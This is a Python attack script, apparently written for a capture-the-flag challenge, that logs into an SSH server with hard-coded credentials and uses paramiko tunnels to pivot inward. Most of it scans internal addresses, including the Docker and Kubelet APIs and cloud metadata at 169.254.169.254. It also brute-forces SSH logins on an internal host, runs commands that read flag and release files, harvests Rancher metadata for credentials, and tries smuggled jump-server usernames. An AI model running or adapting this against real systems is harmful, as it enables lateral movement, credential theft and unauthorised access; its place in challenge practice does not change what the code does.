#!/usr/bin/env python3
"""
SSH特性深度探索 - 稳定版本
重点测试端口转发、内部服务连接
"""

import paramiko
import socket
import time

HOST = "61.147.171.105"
PORT = 55300
USERNAME = "ctf"
PASSWORD = "123456"

def get_ssh_client():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, PORT, USERNAME, PASSWORD)
    return client

def test_reverse_port_forward():
    """测试反向端口转发"""
    print("=" * 60)
    print("[*] 反向端口转发测试")
    print("=" * 60)
    
    client = get_ssh_client()
    transport = client.get_transport()
    
    # 请求反向端口转发
    print("\n[1] 请求反向端口转发(127.0.0.1, 0)...")
    try:
        port = transport.request_port_forward('127.0.0.1', 0)
        print(f"  成功，分配端口: {port}")
        transport.cancel_port_forward('127.0.0.1', port)
    except Exception as e:
        print(f"  失败: {e}")
    
    print("\n[2] 请求反向端口转发(0.0.0.0, 0)...")
    try:
        port = transport.request_port_forward('0.0.0.0', 0)
        print(f"  成功，分配端口: {port}")
        transport.cancel_port_forward('0.0.0.0', port)
    except Exception as e:
        print(f"  失败: {e}")
    
    print("\n[3] 请求反向端口转发('', 0)...")
    try:
        port = transport.request_port_forward('', 0)
        print(f"  成功，分配端口: {port}")
        transport.cancel_port_forward('', port)
    except Exception as e:
        print(f"  失败: {e}")
    
    # 测试绑定到22端口
    print("\n[4] 请求绑定22端口...")
    try:
        port = transport.request_port_forward('127.0.0.1', 22)
        print(f"  成功，分配端口: {port}")
        transport.cancel_port_forward('127.0.0.1', port)
    except Exception as e:
        print(f"  失败: {e}")
    
    client.close()

def test_direct_tcpip_comprehensive():
    """全面测试direct-tcpip"""
    print("\n" + "=" * 60)
    print("[*] Direct-TCPIP全面测试")
    print("=" * 60)
    
    client = get_ssh_client()
    transport = client.get_transport()
    
    # 全面扫描内部网络
    targets = [
        # Kubernetes/Container networking
        ("172.17.0.1", 22),     # Docker host SSH
        ("172.17.0.1", 2375),   # Docker HTTP API
        ("172.17.0.1", 2376),   # Docker HTTPS API
        ("172.17.0.1", 6443),   # Kubernetes API
        ("172.17.0.1", 10250),  # Kubelet API
        ("172.17.0.1", 10255),  # Kubelet read-only
        
        # 本地服务
        ("127.0.0.1", 22),      # 本地SSH (被dropbear fake)
        ("127.0.0.1", 80),      # 本地HTTP
        ("127.0.0.1", 8080),    # 本地HTTP alt
        ("127.0.0.1", 9100),    # Node exporter
        ("127.0.0.1", 9090),    # Prometheus
        
        # Rancher/K8s metadata
        ("172.17.0.2", 80),     # Rancher metadata
        ("169.254.169.254", 80), # AWS/GCP metadata
        ("169.254.169.250", 80), # 内部DNS HTTP?
        
        # 容器网段扫描
        ("10.42.0.1", 22),
        ("10.42.0.1", 80),
        ("10.42.0.2", 22),
        ("10.42.0.2", 80),
        ("10.42.111.1", 22),
        ("10.42.111.1", 80),
    ]
    
    print("\n正在扫描内部服务...")
    for host, port in targets:
        try:
            chan = transport.open_channel(
                "direct-tcpip",
                (host, port),
                ("127.0.0.1", 0)
            )
            chan.settimeout(2)
            
            # 根据端口发送不同的请求
            if port in [80, 8080, 2375, 6443, 10250, 10255, 9090, 9100]:
                chan.send(b"GET / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n")
            
            try:
                banner = chan.recv(1024)
                if banner:
                    preview = banner[:200].decode('utf-8', errors='replace').replace('\n', '\\n')
                    print(f"[+] {host}:{port} => {preview[:80]}")
                else:
                    print(f"[+] {host}:{port} => 连接成功，无数据")
            except socket.timeout:
                print(f"[+] {host}:{port} => 连接成功，读取超时")
            
            chan.close()
        except paramiko.ChannelException as e:
            pass  # 连接被拒绝，静默
        except Exception as e:
            if "refused" not in str(e).lower():
                print(f"[-] {host}:{port} => {e}")
    
    client.close()

def test_ssh_to_real_ubuntu():
    """测试通过转发连接真实Ubuntu"""
    print("\n" + "=" * 60)
    print("[*] 通过转发连接172.17.0.1 Ubuntu")
    print("=" * 60)
    
    client = get_ssh_client()
    transport = client.get_transport()
    
    # 更多用户名/密码组合
    users = ["root", "ubuntu", "ctf", "admin", "user", "flag", "test"]
    passwords = ["", "123456", "password", "root", "ubuntu", "ctf", "flag", "test"]
    
    # 测试特殊格式的用户名 (FakeJumpServer可能会处理)
    special_users = [
        "ctf@localhost",
        "ctf%localhost",
        "localhost\\ctf",
        "ctf@172.17.0.1",
        "root@172.17.0.1",
    ]
    
    print("\n[1] 测试普通用户名...")
    for user in users[:3]:
        for pwd in passwords[:3]:
            try:
                chan = transport.open_channel(
                    "direct-tcpip",
                    ("172.17.0.1", 22),
                    ("127.0.0.1", 0)
                )
                inner = paramiko.SSHClient()
                inner.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                inner.connect("172.17.0.1", username=user, password=pwd, sock=chan, timeout=5)
                print(f"[!!!] 成功: {user}:{pwd}")
                stdin, stdout, stderr = inner.exec_command("id; cat /flag* 2>/dev/null")
                print(stdout.read().decode())
                inner.close()
            except paramiko.AuthenticationException:
                pass
            except Exception as e:
                if "Auth" not in str(e):
                    print(f"[-] {user}:{pwd} - {e}")
    
    print("\n[2] 测试特殊格式用户名...")
    for user in special_users:
        for pwd in ["123456", ""]:
            try:
                chan = transport.open_channel(
                    "direct-tcpip",
                    ("172.17.0.1", 22),
                    ("127.0.0.1", 0)
                )
                inner = paramiko.SSHClient()
                inner.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                inner.connect("172.17.0.1", username=user, password=pwd, sock=chan, timeout=5)
                print(f"[!!!] 成功: {user}:{pwd}")
                inner.close()
            except paramiko.AuthenticationException:
                pass
            except Exception as e:
                # 打印非认证错误
                if "Auth" not in str(e) and "connect" not in str(e).lower():
                    print(f"[-] {user}:{pwd} - {e}")
    
    client.close()

def test_connect_through_localhost_fake():
    """测试通过localhost fake来理解行为"""
    print("\n" + "=" * 60)
    print("[*] 分析localhost fake行为")
    print("=" * 60)
    
    client = get_ssh_client()
    transport = client.get_transport()
    
    # 连接到被fake的localhost
    print("\n[1] 连接localhost:22 (被fake)...")
    try:
        chan = transport.open_channel(
            "direct-tcpip",
            ("localhost", 22),
            ("127.0.0.1", 0)
        )
        
        banner = chan.recv(1024).decode('utf-8', errors='ignore')
        print(f"  Banner: {banner.strip()}")
        
        # 通过这个fake的连接再建立SSH
        print("\n[2] 通过fake的localhost再SSH...")
        inner = paramiko.SSHClient()
        inner.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # 重新建立通道
        chan2 = transport.open_channel(
            "direct-tcpip",
            ("localhost", 22),
            ("127.0.0.1", 0)
        )
        
        inner.connect("localhost", username="ctf", password="123456", sock=chan2, timeout=5)
        print("  认证成功!")
        
        inner_transport = inner.get_transport()
        print(f"  远程版本: {inner_transport.remote_version}")
        
        # 获取host key
        inner_key = inner_transport.get_remote_server_key()
        inner_fingerprint = inner_key.get_fingerprint().hex()
        print(f"  Host Key指纹: {inner_fingerprint}")
        
        # 尝试在这个嵌套连接中再转发到172.17.0.1
        print("\n[3] 从嵌套连接转发到172.17.0.1...")
        try:
            inner_chan = inner_transport.open_channel(
                "direct-tcpip",
                ("172.17.0.1", 22),
                ("127.0.0.1", 0)
            )
            inner_banner = inner_chan.recv(1024).decode('utf-8', errors='ignore')
            print(f"  Banner: {inner_banner.strip()}")
            
            # 检查这个是否也是fake
            inner_chan2 = inner_transport.open_channel(
                "direct-tcpip",
                ("172.17.0.1", 22),
                ("127.0.0.1", 0)
            )
            inner_ssh = paramiko.SSHClient()
            inner_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            inner_ssh.connect("172.17.0.1", username="ctf", password="123456", sock=inner_chan2, timeout=5)
            print("  !!!嵌套转发认证成功!!!")
            stdin, stdout, stderr = inner_ssh.exec_command("id; hostname; cat /etc/*release | head -5")
            print(stdout.read().decode())
            inner_ssh.close()
        except paramiko.AuthenticationException:
            print("  嵌套转发认证失败")
        except Exception as e:
            print(f"  嵌套转发错误: {e}")
        
        inner.close()
        chan.close()
    except Exception as e:
        print(f"错误: {e}")
    
    client.close()

def test_rancher_metadata_credentials():
    """从Rancher metadata获取可能的凭据"""
    print("\n" + "=" * 60)
    print("[*] Rancher Metadata凭据搜索")
    print("=" * 60)
    
    client = get_ssh_client()
    transport = client.get_transport()
    
    try:
        chan = transport.open_channel(
            "direct-tcpip",
            ("172.17.0.2", 80),
            ("127.0.0.1", 0)
        )
        chan.settimeout(5)
        
        # 搜索可能包含凭据的端点
        endpoints = [
            "/latest/self/container/environment",
            "/latest/self/host",
            "/latest/self/host/agent_ip",
            "/latest/containers",
            "/latest/services",
            "/latest/stacks",
            "/2015-07-25/meta-data/",
            "/2015-12-07/meta-data/",
            "/2016-06-30/meta-data/",
        ]
        
        for endpoint in endpoints:
            try:
                chan = transport.open_channel(
                    "direct-tcpip",
                    ("172.17.0.2", 80),
                    ("127.0.0.1", 0)
                )
                chan.settimeout(3)
                request = f"GET {endpoint} HTTP/1.0\r\nHost: rancher-metadata\r\nAccept: application/json\r\n\r\n"
                chan.send(request.encode())
                response = chan.recv(8192).decode('utf-8', errors='ignore')
                
                # 提取body
                if "\r\n\r\n" in response:
                    body = response.split("\r\n\r\n", 1)[1]
                    if body and "404" not in response[:50]:
                        print(f"\n{endpoint}:")
                        print(body[:500])
                
                chan.close()
            except Exception as e:
                pass
        
    except Exception as e:
        print(f"错误: {e}")
    
    client.close()

def test_ssh_jump_syntax():
    """测试SSH ProxyJump语法"""
    print("\n" + "=" * 60)
    print("[*] SSH ProxyJump/跳板行为分析")
    print("=" * 60)
    
    client = get_ssh_client()
    transport = client.get_transport()
    
    # 根据FakeJumpServer的概念，dropbear可能会解析用户名中的跳板信息
    # 尝试各种格式
    
    jump_formats = [
        # ProxyJump风格
        "ctf@172.17.0.1",
        "ctf%172.17.0.1",
        "ctf+172.17.0.1",
        "172.17.0.1!ctf",
        # 嵌套风格
        "ctf@172.17.0.1@ctf",
        "172.17.0.1:ctf",
        # 特殊
        "ctf@real",
        "ctf@host",
        "ctf@ubuntu",
    ]
    
    print("\n直接使用不同格式的用户名连接dropbear...")
    for fmt in jump_formats:
        try:
            test_client = paramiko.SSHClient()
            test_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            test_client.connect(HOST, PORT, username=fmt, password="123456", timeout=5)
            print(f"[!!!] 用户名 '{fmt}' 成功!")
            
            # 检查连接的是什么
            test_transport = test_client.get_transport()
            key = test_transport.get_remote_server_key()
            fingerprint = key.get_fingerprint().hex()
            print(f"  Host Key: {fingerprint}")
            
            # 尝试执行命令
            try:
                stdin, stdout, stderr = test_client.exec_command("id; hostname")
                output = stdout.read().decode()
                print(f"  Output: {output[:100]}")
            except:
                pass
            
            test_client.close()
        except paramiko.AuthenticationException:
            pass  # 静默
        except Exception as e:
            if "Auth" not in str(e):
                print(f"[-] '{fmt}': {e}")
    
    client.close()

if __name__ == "__main__":
    test_reverse_port_forward()
    test_direct_tcpip_comprehensive()
    test_ssh_to_real_ubuntu()
    test_connect_through_localhost_fake()
    test_rancher_metadata_credentials()
    test_ssh_jump_syntax()
